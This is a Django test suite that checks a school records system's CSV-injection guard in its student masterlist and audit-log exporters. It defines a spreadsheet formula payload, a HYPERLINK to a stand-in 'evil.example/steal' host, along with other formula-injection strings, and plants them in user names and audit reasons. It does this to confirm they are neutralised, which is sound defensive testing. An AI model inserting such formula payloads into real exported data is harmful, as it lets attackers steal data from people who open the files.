"""
# // ==============================================================================
# // KCC CLASSSTAMP - SPREADSHEET EXPORT SAFETY TESTS
# // ==============================================================================
# // Covers the OWASP CSV-injection guard:
# //   - formula payloads are neutralised in every exported cell
# //   - ordinary numbers and negative numbers are left untouched
# //   - the student masterlist and audit-log exporters both apply the guard
# // ==============================================================================
"""

from decimal import Decimal

from django.contrib.auth import get_user_model
from django.test import TestCase

from apps.core.models import AuditEvent, Department, Profile, Program
from apps.core.services.export_service import (
    export_student_directory_csv,
    safe_spreadsheet_cell,
    safe_spreadsheet_row,
)

User = get_user_model()

PAYLOAD = '=HYPERLINK("http://evil.example/steal","click")'


class SafeSpreadsheetCellTests(TestCase):
    def test_formula_payload_is_prefixed(self):
        for payload in (PAYLOAD, '+1+1', '@SUM(A1)', '-1+1'):
            self.assertTrue(
                safe_spreadsheet_cell(payload).startswith("'"),
                f'{payload!r} must be neutralised',
            )

    def test_control_prefixes_are_neutralised(self):
        self.assertTrue(safe_spreadsheet_cell('\t=1+1').startswith("'"))
        self.assertTrue(safe_spreadsheet_cell('\r=1+1').startswith("'"))
        self.assertTrue(safe_spreadsheet_cell('\n=1+1').startswith("'"))

    def test_plain_numbers_are_untouched(self):
        self.assertEqual(safe_spreadsheet_cell(0), 0)
        self.assertEqual(safe_spreadsheet_cell(42), 42)
        self.assertEqual(safe_spreadsheet_cell(Decimal('1.50')), Decimal('1.50'))
        self.assertEqual(safe_spreadsheet_cell('-5'), '-5')
        self.assertEqual(safe_spreadsheet_cell('-5.25'), '-5.25')

    def test_plain_text_is_untouched(self):
        self.assertEqual(safe_spreadsheet_cell('Dela Cruz'), 'Dela Cruz')
        self.assertEqual(safe_spreadsheet_cell('2026-0001'), '2026-0001')
        self.assertEqual(safe_spreadsheet_cell(None), '')
        self.assertEqual(safe_spreadsheet_cell(''), '')

    def test_row_helper_applies_to_every_cell(self):
        row = safe_spreadsheet_row(['Ana', PAYLOAD, 7, None])
        self.assertEqual(row[0], 'Ana')
        self.assertTrue(row[1].startswith("'"))
        self.assertEqual(row[2], 7)
        self.assertEqual(row[3], '')


class ExportEndpointSafetyTests(TestCase):
    def setUp(self):
        self.department = Department.objects.create(code='CCS', name='College of Computer Studies')
        self.program = Program.objects.create(
            department=self.department, code='BSIT',
            name='BS Information Technology', years_total=4,
        )

        self.student_user = User.objects.create_user(
            username='csv_student',
            first_name=PAYLOAD,
            last_name='Cruz',
            email='csv.student@example.com',
        )
        Profile.objects.create(
            user=self.student_user,
            role=Profile.ROLE_STUDENT,
            student_number='2026-3000',
            program=self.program,
            year_level=1,
            approval_status=Profile.APPROVAL_APPROVED,
        )

    def test_student_masterlist_neutralises_name_payload(self):
        response = export_student_directory_csv({})
        body = response.content.decode('utf-8')

        self.assertIn("'=HYPERLINK(", body)

    def test_audit_log_export_neutralises_reason_payload(self):
        from apps.core.views.audit_views import admin_audit_log_export_csv

        AuditEvent.objects.create(
            actor=self.student_user,
            action='TEST_EVENT',
            object_type='Profile',
            object_id='1',
            reason=PAYLOAD,
            new_value='ok',
        )

        admin = User.objects.create_user(username='csv_admin', is_staff=True)
        Profile.objects.create(user=admin, role=Profile.ROLE_ADMIN)
        self.client.force_login(admin)

        response = self.client.get('/admin/audit-log/export-csv/')

        self.assertEqual(response.status_code, 200)
        body = response.content.decode('utf-8')
        self.assertIn("'=HYPERLINK(", body)
